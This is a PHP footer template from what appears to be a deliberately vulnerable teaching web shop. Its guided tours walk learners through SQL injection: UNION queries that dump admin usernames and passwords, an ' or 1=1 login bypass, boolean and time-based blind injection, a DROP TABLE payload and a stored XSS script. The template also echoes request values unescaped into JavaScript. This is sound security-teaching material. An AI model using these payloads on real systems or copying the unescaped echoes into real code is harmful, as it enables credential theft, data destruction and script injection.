<footer class="text-center footer mt-auto">
    <hr>
    <p class="text-sm mt-3"><small>*Each year your Airtime Plan will be increased by the Retail Price Index (RPI) rate of inflation announced in February plus 3.9%. If RPI is negative, we’ll only apply the 3.9%. You’ll see this increase on your April <?php echo date('Y', strtotime('+1 year')); ?> bill onwards. See codenation-advanced.com/prices.</small></p>
    <p class="my-3 text-muted ">&copy; Codenation Shop <?php echo date("Y"); ?></p>
    <ul class="list-inline text-center">
        <li class="list-inline-item"><a href="#">Privacy</a></li>
        <li class="list-inline-item"><a href="#">Terms</a></li>
        <li class="list-inline-item"><a href="#">Support</a></li>
    </ul>
    </div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script>
<script>
    new WOW().init();
</script>
<script>
    function filterCategory() {
        document.getElementById("filter_category").submit();
    }
</script>

<!-- Get current URL for flag matching -->
<?php $this_page_url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>
<?php $tour = isset($_GET['tour']) ? $_GET['tour'] : null; ?>

<!-- Task Two Tour -->
<script>
    // InBandSqli tour object
    const InBandSqliTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    // InBandSqli tour steps
    if ('<?php echo $tour; ?>' == 'in_band_sqli') {
        localStorage.setItem('InBandSqli', true);
        InBandSqliTour.addStep({
            id: 'step-1',
            text: 'We should be able to figure out how many columns there are with something like this in the URL bar <code><?php echo ROOT_URL; ?>product.php?id=0 order by 7</code>',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%207";
                }
            }]
        });
    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20order%20by%207" && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-2',
            text: 'This will indicate that the range is 1 to 7 as there is no error message from the server.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7";
                }
            }]
        });
    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,2,3,4,5,6,7" && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-3',
            text: 'With <code>union select 1,2,3,4,5,6,7</code> we can create a virtual table.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: InBandSqliTour.next
            }]
        });
        InBandSqliTour.addStep({
            id: 'step-4',
            text: 'You will see that column 2 and 3 values are being outputted, this means we could try passing in functions that can give us more meaningful information.',
            attachTo: {
                element: '#title',
                on: 'left'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7";
                }
            }]
        });
    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),3,4,5,6,7" && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-5',
            text: 'With <code>union select 1,database(),3,4,5,6,7</code> we can get the database name.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: InBandSqliTour.next
            }]
        });
        InBandSqliTour.addStep({
            id: 'step-6',
            text: 'Having the database name means we can use it to bring other important information.',
            attachTo: {
                element: '#title',
                on: 'left'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,database(),group_concat(table_name),4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=%27cvsa%27' && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-7',
            text: 'With <code>information_schema.tables</code> we can get all the table names.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: InBandSqliTour.next
            }]
        });
        InBandSqliTour.addStep({
            id: 'step-8',
            text: "Having the table name means we can now check to see if there's one worth looking at, like the admin one.",
            attachTo: {
                element: '#title',
                on: 'left'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22#';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(column_name),3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name=%22admin%22' && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-9',
            text: 'Now we can get the colum names for the admin table and see whats in there with <code>information_schema.columns WHERE table_name="admin"</code>',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: InBandSqliTour.next
            }]
        });
        InBandSqliTour.addStep({
            id: 'step-10',
            text: "As you can see we have the username and password which we can now use to gain access to the values.",
            attachTo: {
                element: '#title',
                on: 'left'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7%20FROM%20admin';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20union%20select%201,group_concat(username,%27:%27,password%20SEPARATOR%20%27%3Cbr%3E%27),3,4,5,6,7%20FROM%20admin' && localStorage.getItem('InBandSqli')) {
        InBandSqliTour.addStep({
            id: 'step-11',
            text: "You should now see the username and the password.",
            attachTo: {
                element: '#title',
                on: 'left'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    InBandSqliTour.complete();
                    localStorage.removeItem('InBandSqli');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }

    InBandSqliTour.start();
</script>

<!-- Auth Bypass Tour -->
<script>
    // authBypassSqli tour object
    const authBypassSqliTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    // authBypassSqli tour steps
    if ('<?php echo $tour; ?>' == 'auth_bypass_sqli') {
        localStorage.setItem('authBypassSqli', true);
        authBypassSqliTour.addStep({
            id: 'step-1',
            text: "When logging in the output has to evaluate to true  <code>' or 1=1;#</code> This piece of SQLI will make the query output to true because its reading it as username can be anything or one is equal to one.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    authBypassSqliTour.next();
                    document.getElementById('username').value = "' or 1=1;#";
                    document.getElementById('password').value = "anything";
                }
            }]
        });
        authBypassSqliTour.addStep({
            id: 'step-2',
            text: "Click next to submit this.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    document.getElementById('login_submit').click();
                }

            }]
        });
    } else if ("<?php echo $this_page_url; ?>" == "<?php echo ROOT_URL; ?>admin/" && localStorage.getItem('authBypassSqli')) {
        authBypassSqliTour.addStep({
            id: 'step-11',
            text: "YNow you can see that we have logged in without a valid username and password.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    authBypassSqliTour.complete();
                    localStorage.removeItem('authBypassSqli');
                    window.open('<?php echo ROOT_URL; ?>admin/logout.php', '_self');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }

    authBypassSqliTour.start();
</script>

<!-- Boolean Based Tour -->
<script>
    // booleanBasedSqli tour object
    const booleanBasedSqliTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    // booleanBasedSqli tour steps
    if ('<?php echo $tour; ?>' == 'boolean_based_sqli') {
        localStorage.setItem('booleanBasedSqli', true);
        booleanBasedSqliTour.addStep({
            id: 'step-1',
            text: "Every time you see the display change it means that the output is true or false. You can do this with something like this  <code>http://localhost/cvsa/product.php?id=0 or length(database())=1;</code> .",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20length(database())=1;';
                }
            }]
        });

    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20length(database())=1;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-2',
            text: "This should remove the display as there is no product with the id of 0 because msql auto increment id start from 1 and the length of the database name is not 1.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20length(database())=4;';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20length(database())=4;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-3',
            text: "This should display the a product which indicates that the query is true and that the length of the database name is 4.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20substring(database(),1,1)="a";';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20substring(database(),1,1)=%22a%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-4',
            text: 'Now that we know that the length of the database name is 4, we can try to figure out what the name is by doing something like this <code><?php echo ROOT_URL; ?>product.php?id=0 or substring(database(),1,1)="a";</code>',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20substring(database(),1,4)="cvsa";';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20substring(database(),1,4)=%22cvsa%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-5',
            text: 'What you have to do is keep adjusting the last paramater of <code>substring(database(),1,4)</code> by checking the first character, then the first with the second, etc. This is so that you can check each letter of the alphabet for each character and build up.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22%d%%22;';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22%d%%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-6',
            text: 'Or you can use <code>product.php?id=0 or database() like "%a%";</code> This is so that you can check if a letter of the alphabet exists.',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22%cv%%22;';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22%cv%%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-7',
            text: 'You can also try a combination of the letters but they must exist in the same way aginst what your checking for',
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0 or database() like "cv_a";';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22cv_a%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-8',
            text: "With an underscore you can establish a true result from the query as way of replacing a character you may not know",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22cvsa%22;';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20database()%20like%20%22cvsa%22;' && localStorage.getItem('booleanBasedSqli')) {
        booleanBasedSqliTour.addStep({
            id: 'step-9',
            text: "By being able to check for changes within the content you can sum up information based on a boolean result.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    booleanBasedSqliTour.complete();
                    localStorage.removeItem('booleanBasedSqli');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }
    booleanBasedSqliTour.start();
</script>

<!-- Time Based SQLI Tour -->
<script>
    // timeBasedSqli tour object
    const timeBasedSqliTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    // timeBasedSqli tour steps
    if ('<?php echo $tour; ?>' == 'time_based_sqli') {
        localStorage.setItem('timeBasedSqli', true);
        timeBasedSqliTour.addStep({
            id: 'step-1',
            text: "You're not looking for an indication in content being displayed or an error but the refresh time it takes of a response from the server. <code><?php echo ROOT_URL; ?>product.php?id=0 or if(condition, true, false);</code>. By clicking on next it should take you a while to get the next page.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20if(length(database())=%221%22,%20sleep(2),%20sleep(5));';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20if(length(database())=%221%22,%20sleep(2),%20sleep(5));' && localStorage.getItem('timeBasedSqli')) {
        timeBasedSqliTour.addStep({
            id: 'step-2',
            text: "Since the condition in the URL is false you should have arrived on this page after a while. However, because of things like portfowarding or general internet download speed, it could mean it can take longer. But you can still tell the difference, think of both the parameters as ratios of how long it should take to refresh.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>product.php?id=0%20or%20if(database()=%22cvsa%22,%20sleep(2),%20sleep(5));';
                }
            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=0%20or%20if(database()=%22cvsa%22,%20sleep(2),%20sleep(5));' && localStorage.getItem('timeBasedSqli')) {
        timeBasedSqliTour.addStep({
            id: 'step-3',
            text: "This took you less time to get to this page than the previous page because the SQL query evaluated to true.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    timeBasedSqliTour.complete();
                    localStorage.removeItem('timeBasedSqli');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }
    timeBasedSqliTour.start();
</script>

<!-- Drop Table SQLI -->
<script>
    // dropTableSqli tour object
    const dropTableSqliTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    // dropTableSqli tour steps
    if ('<?php echo $tour; ?>' == 'drop_table_sqli') {
        localStorage.setItem('dropTableSqli', true);
        dropTableSqliTour.addStep({
            id: 'step-1',
            text: "Click next to enter the login details.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    dropTableSqliTour.next();
                    document.getElementById('username').value = "admin";
                    document.getElementById('password').value = "admin";
                }
            }]
        });
        dropTableSqliTour.addStep({
            id: 'step-2',
            text: "Click next to submit this.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    document.getElementById('login_submit').click();
                }

            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>admin/' && localStorage.getItem('dropTableSqli')) {
        dropTableSqliTour.addStep({
            id: 'step-3',
            text: "Click next to go the create product page.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>admin/create.php';
                }

            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>admin/create.php' && localStorage.getItem('dropTableSqli')) {
        if ('<?php echo empty($result); ?>' == 1) {
            dropTableSqliTour.addStep({
                id: 'step-3',
                text: "Now visit the products page by clicking next.",
                attachTo: {
                    element: '#image',
                    on: 'top'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        window.location.href = '<?php echo ROOT_URL; ?>products.php';
                    }

                }]
            });
        } else {
            dropTableSqliTour.addStep({
                id: 'step-1',
                text: "Click next to enter the details with the SQL injection.",
                attachTo: {
                    element: '#image',
                    on: 'top'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        dropTableSqliTour.next();
                        document.getElementById('title').value = "xss attack";
                        document.getElementById('description').value = "'); DROP TABLE products; --";
                        document.getElementById('price').value = "10";
                        document.getElementById('cat_id').value = "1";
                    }
                }]
            });
            dropTableSqliTour.addStep({
                id: 'step-2',
                text: "Click next to submit this.",
                attachTo: {
                    element: '#image',
                    on: 'top'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        document.getElementById('product_form_submit').click();
                    }

                }]
            });
        }
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>products.php' && localStorage.getItem('dropTableSqli')) {
        dropTableSqliTour.addStep({
            id: 'step-1',
            text: "You should now see that all the products have dissappeared and there are error messages from MySQL.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    dropTableSqliTour.complete();
                    localStorage.removeItem('dropTableSqli');
                    window.open('<?php echo ROOT_URL; ?>admin/logout.php', '_self');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }

    dropTableSqliTour.start();
</script>

<!-- Cross Site Scripting -->
<script>
    // crossSiteScript tour object
    const crossSiteScriptTour = new Shepherd.Tour({
        defaultStepOptions: {
            classes: '.shepherd-theme-custom',
            scrollTo: true
        }
    });

    if ('<?php echo $tour; ?>' == 'cross_site_script') {
        localStorage.setItem('crossSiteScript', true);
        crossSiteScriptTour.addStep({
            id: 'step-1',
            text: "Click next to enter the login details.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    crossSiteScriptTour.next();
                    document.getElementById('username').value = "admin";
                    document.getElementById('password').value = "admin";
                }
            }]
        });
        crossSiteScriptTour.addStep({
            id: 'step-2',
            text: "Click next to submit this.",
            attachTo: {
                element: '#username',
                on: 'right'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    document.getElementById('login_submit').click();
                }

            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>admin/' && localStorage.getItem('crossSiteScript')) {
        crossSiteScriptTour.addStep({
            id: 'step-3',
            text: "Click next to go the create product page.",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Next',
                action: () => {
                    window.location.href = '<?php echo ROOT_URL; ?>admin/create.php';
                }

            }]
        });
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>admin/create.php' && localStorage.getItem('crossSiteScript')) {

        if ('<?php echo isset($products['title']) ? $products['title'] : null; ?>' == 'xss attack') {
            crossSiteScriptTour.addStep({
                id: 'step-3',
                text: "Click next to go the xss product page.",
                attachTo: {
                    element: '.tour',
                    on: 'bottom'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        window.location.href = '<?php echo ROOT_URL; ?>product.php?id=<?php echo isset($products['id']) ? $products['id'] : null; ?>';
                    }

                }]
            });
        } else {
            crossSiteScriptTour.addStep({
                id: 'step-1',
                text: "Click next to enter the details with the SQL injection.",
                attachTo: {
                    element: '#image',
                    on: 'top'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        crossSiteScriptTour.next();
                        document.getElementById('title').value = "xss attack";
                        document.getElementById('description').value = '<script id="xss">alert("Attacked by XSS");<\/script>';
                        document.getElementById('price').value = "10";
                        document.getElementById('cat_id').value = "1";
                    }
                }]
            });
            crossSiteScriptTour.addStep({
                id: 'step-2',
                text: "Click next to submit this.",
                attachTo: {
                    element: '#image',
                    on: 'top'
                },
                classes: '.example-step-extra-class',
                buttons: [{
                    text: 'Next',
                    action: () => {
                        document.getElementById('product_form_submit').click();
                    }
                }]
            });
        }
    } else if ('<?php echo $this_page_url; ?>' == '<?php echo ROOT_URL; ?>product.php?id=<?php echo isset($_GET['id']) ? $_GET['id'] : null; ?>' && localStorage.getItem('crossSiteScript')) {
        crossSiteScriptTour.addStep({
            id: 'step-1',
            text: "You should see an alert executed by the script. This means that script tags even though entered as text can be rendered as html script tags",
            attachTo: {
                element: '.tour',
                on: 'bottom'
            },
            classes: '.example-step-extra-class',
            buttons: [{
                text: 'Finish',
                action: () => {
                    crossSiteScriptTour.complete();
                    localStorage.removeItem('crossSiteScript');
                    window.open('<?php echo ROOT_URL; ?>admin/logout.php', '_self');
                    window.location.href = '<?php echo ROOT_URL; ?>docs.php';
                }
            }]
        });
    }
    crossSiteScriptTour.start();
</script>

</body>

</html>